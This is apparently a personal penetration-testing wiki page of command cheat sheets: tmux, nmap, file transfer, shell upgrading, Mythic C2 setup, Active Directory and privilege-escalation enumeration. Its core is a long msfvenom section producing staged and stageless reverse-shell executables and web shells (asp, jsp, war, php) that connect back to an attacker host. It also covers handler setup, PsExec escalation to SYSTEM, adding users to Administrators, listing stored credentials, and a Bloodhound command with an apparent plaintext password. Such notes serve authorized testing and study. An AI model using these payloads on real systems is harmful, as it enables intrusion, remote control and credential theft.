---
layout: single
title: "Wiki"
sidebar:
    nav: wiki-navigation
classes: wide
---

## tmux
### tmux commands

```
tmux: opens tmux
PREFIX + c: creates new pane
PREFIX + p: jump back a pane
PREFIX + #: jump to a certain pane based on number
PREFIX + .: move a pane
PREFIX + x: delete a pane
PREFIX + ,: rename a pane
PREFIX + $: rename a window
PREFIX + D: detach from tmux session
  > tmux attach -t 0: get back into tmux
PREFIX + %: split pane vertically
PREFIX + ": split pane horizontally
```

### tmux essentials

```
tmux attach -t <name>: attach back into a session
tmux new -s <name>: create new tmux session
tmux source-file ~/.tmux.conf: reload .tmux.conf
tmux ls: show all tmux sessions
```

### tmux-logging

```
Logging: prefix + shift + p
Screen capture: prefix + alt + p
Save all history: prefix + alt + shift + p
Clear pane history: prefix + alt + c
```

## NMAP

### find nmap scripts

```
locate <service/keyword> | grep .nse$
  > locate http- | grep .nse$
locate *.nse | grep <service/keyword>
```

### network sweep

```
sudo arp-scan --interface=eth0 192.168.182.0/24
```

## FILE TRANSFER

### smb

```
smbserver.py -smb2support <share name> .
KALI to WINDOWS: copy \\<SMB IP>\<folder>\<file> C:\<file location>
WINDOWS to KALI: copy <file> \\<SMB IP>\<folder>\<file>

Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All if sharing doesn't work. Restart required
**set-executionpolicy remotesigned to enable running scripts
```

### nc

```
RECIEVING END: nc -l -p <port> > <file>
SENDING END: nc -w 3 <IP> <port> < lse1.txt
```

### python

```
Python 2: python -m SimpleHTTPServer <port>
Python 3: python -m http.server <port>
  > --directory </path/to/directory>
  > --bind <specific IP>
```

## FULL FUNCTONING SHELL
### spawn tty shell

```
which python
  > ls /usr/bin | grep python
  > apt list --installed | grep python
  > dpkg -l | grep python
python -c 'import pty; pty.spawn("/bin/bash")'

CTRL + Z to background terminal
echo $TERM
stty raw -echo; fg
reset
paste $TERM value
```

## PORT FORWARDING
### ssh port forwarding

**DO THIS ON THE MACHINE THAT YOU WANT TO PORT FORWARD TO (AKA YOUR HOST)**

```
ssh -L <local port>:<local IP>:<remote port> <remote user>@<remote domain/ip>
```

## INSTALLATIONS

### C2

#### Mythic

```
git clone https://github.com/its-a-feature/Mythic
sudo ./mythic-cli mythic start
sudo nano .env (if you want to edit the configuration)

./install_docker_ubuntu
sudo ./mythic-cli mythic start
sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo.git
sudo ./mythic-cli install github https://github.com/MythicAgents/Medusa.git
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http.git
```

#### Covenant

```

```

### jVis

```

```

### Docker

```
DOCKER
printf "%s\n" "deb [arch=amd64 signed-by=/usr/share/keyrings/docker-ce-archive-keyring.gpg] https://download.docker.com/linux/debian buster stable" | sudo tee /etc/apt/sources.list.d/docker-ce.list
curl -fsSL https://download.docker.com/linux/debian/gpg | gpg --dearmor | sudo tee /usr/share/keyrings/docker-ce-archive-keyring.gpg
sudo apt install docker-ce docker-ce-cli

DOCKER-COMPOSE
sudo curl -L "https://github.com/docker/compose/releases/download/2.1.0/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
sudo chmod +x /usr/local/bin/docker-compose
sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose (if docker-compose no worky)
```

## AutoRecon

```
autorecon <IP 1> <IP 2> -o <output location>
  > autorecon <hostname 1>
  > autorecon <IP block/24>
  > autorecon -t <target file>
```

## METASPLOIT

### msfvenom

#### Non-Meterpreter

##### **Windows**

```
STAGED
x86: msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
x64: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

```
STAGELESS
x86: msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
x64: msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

##### **Linux**

```
STAGED
x86: msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
x64: msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

```
STAGELESS
x86: msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
x64: msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

##### **Web**

```
asp: msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
jsp: msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
war: msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
php: msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

#### Meterpreter

##### Windows

```
STAGED
x86: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
x64: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

```
STAGELESS
x86: msfvenom -p windows/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exee
x64: msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

##### Linux

```
STAGED
x86: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
x64: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

```
STAGELESS
x86: msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
x64: msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

##### Web

```
asp: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
jsp: msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > example.jsp
war: msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > example.war
php: msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

To use meterpreter shells make sure to: 

```
use exploit/multi/handler
set payload <payload>
  > set payload windows/shell/reverse_tcp

run post/multi/recon/local_exploit_suggester
```

## SERVICES

### SMB

```
nmap --script smb-os* -p 139,445 -oN smb-scan.nmap <IP>

enum4linux -a <IP> > <output>

smbclient -L //<IP>/: lists open SMB shares
smbclient //<IP>/<share>: connect to an open SMB share

use auxiliary/scanner/smb/smb_version
```

### HTTP

#### Checklist

- Run `gobuster`
- Quick check: 
  - /robots.txt
  - /sitemap.xml
  - /crossdomain.xml
  - /clientaccesspolicy.xml
  - /.well-known/
  - Check also comments in the main and secondary pages

#### gobuster

- `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

### FTP

`ftp <IP>`

#### Checklist

- Can you log in as anonymous?
- Do you have R/W access?
- Can you upload files?
- `nmap --script ftp-* -p 21 <IP>`

#### FTP Commands

- `mkdir`
- `put`
- `get`
- `ls`
- `binary` (for webshells)
- `ascii`
- `ftp://anonymous:anonymous@<IP>`

## AD Enumeration

### System Enumeration

```
Systeminfo: Detailed information and configurations of the machine

```



- `Systeminfo`: Detailed information and configurations of the machine
- `wmic STARTUP GET Caption, Command, User`: Finds programs/scripts that start on boot
- `wmic <useraccount/group/services. list`: Gets info about users/groups/services
- `Net <user/group>`: Lists all local and domain users/groups
- `Net file`: Shows a list of open files on a server
- `Net share`: Lists/manages shared resources on the machine
- `Net start`: Displays running services
- `schtasks /query`
- `Cmdkey /list`: Displays a list of all user names and credentials that are stored in credential manager
- `Icacls <path>` > `icacls "C:\Users\*" | findstr "(F)" | findstr "Everyone"`
  - **F** (full access)
  - **M** (modify access)
  - **RX** (read and execute access)
  - **R** (read-only access)
  - **W** (write-only access)
  - **(OI)**: object inherit
  - **(CI)**: container inherit
  - **(IO)**: inherit only
  - **(NP)**: do not propagate inherit
  - **(I)**: permission inherited from parent container
- `netstat -anob`

### Domain Enumeration

- `Get-ADDomain <domain>`
- `Get-ADGroup <Group>`: Gets info about the domain groups or specified group.
- `Get-ADGroupMember <Group>`: Gets info about the members of a Domain Group
  - `Get-ADGroupMember "Domain Admins"`
- `Get-ADComputer <Computer>`
  - `Get-ADComputer -Filter {ServicePrincipalName -like “*TERMSRV*”}`: finds all computers running RDP
- `Get-ADUser`
  - `Get-ADUser -Filter {ServicePrincipalName -like “*”}`
- `Get-GPO`

### Powersploit

`/usr/lib/python3/dist-packages/cme/data/powersploit`

- `/usr/lib/python3/dist-packages/cme/data/powersploit/Recon/PowerView.ps1`
  - https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
  - https://powersploit.readthedocs.io/en/latest/Recon/
- `/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1`: for priv esc
  - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
  - https://powersploit.readthedocs.io/en/latest/Privesc/

#### Commands

https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

- `Get-NetUser | select cn`
- `Get-NetGroup -GroupName *admin*`
- `Get-NetGPOGroup`: Finds a list of accounts with elevated privileges by scanning GPOs on the Domain
- `Find-InterestingFile`: Searches a local or remote path for files with specific terms in the name
- `Invoke-FileFinder`: Finds sensitive files on hosts by searching shared folders

## Tools

### Windows

#### systeminfo

`systeminfo`

#### whoami

`whoami /priv`

```
Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

#### Windows Exploit Suggester

If `systeminfo` works, you can run [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

`./windows-exploit-suggester.py --update`

1. Update the database by running `python windows-exploit-suggester.py --update`. This will output an excel spreadsheet (either `xls` or `xlsx`).
2. Copy the `systeminfo` output to a text file
3. Run `python windows-exploit-suggester.py --database 2021-07-04-mssb.xls --systeminfo win7-6.1.7600-systeminfo.txt`
   1. The `--database` flag needs the excel spreadsheet that was just created
   2. The `--systeminfo` flag needs the systeminfo output in a text file

#### Registry

- `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

  ```
  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
      SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
      VMware User Process    REG_SZ    "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
      My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"
  ```

- `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`

#### Windows Suggestions

- If RDP is enabled, try adding a low priv user to the Administrators group by running `net localgroup administrators  /add`
- Go from Admin to SYSTEM: `.\PsExec64.exe -accepteula -i -s C:\PrivEsc\reverse.exe`

#### PowerUp

- Initialize: `. .\PowerUp.ps1`
- Run `Invoke-AllChecks`

#### Bloodhound

`bloodhound-python -u ssolper -p orbital#1 -ns 10.10.10.102 -d ORBITAL-WEAPONS.corp -c All`

##### SharpUp

- `.\SharpUp.exe`
  - There are a lot of flags depending on what you're trying to enumerate. Alternatively, you can run `.\SharpUp.exe all` to run all enumeration checks

#### winPEAS

**Note: Run `reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1` to enable color. Reopen `CMD`

- Run `winPEASany.exe`
  - `-h` shows flags you can use, but all checks are executed except `cmd`

#### accesschk.exe

- `.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"`: checks R/W permission of a service
  - `.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc` (for registry)
- `.\accesschk.exe /accepteula -u(w)cqv <user> <service>`: checks service permissions to see if you can start/stop a service
- `.\accesschk.exe /accepteula -uwdq C:\`: checks directory permissions (Unquoted Service Path)

### Linux

#### Linux Smart Enumeration

- https://github.com/diego-treitos/linux-smart-enumeration

#### linPEAS

- https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

#### Other Tools

- https://github.com/linted/linuxprivchecker
- https://github.com/AlessandroZ/BeRoot
- http://pentestmonkey.net/tools/audit/unix-privesc-check

## References

### Windows

- https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
  - https://book.hacktricks.xyz/windows/windows-local-privilege-escalation
- https://book.hacktricks.xyz/windows/active-directory-methodology
- http://nathaneberhardt.com/2020/09/24/windows-reconnaissance-guide/

### Linux

- https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
  - https://book.hacktricks.xyz/linux-unix/privilege-escalation
- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

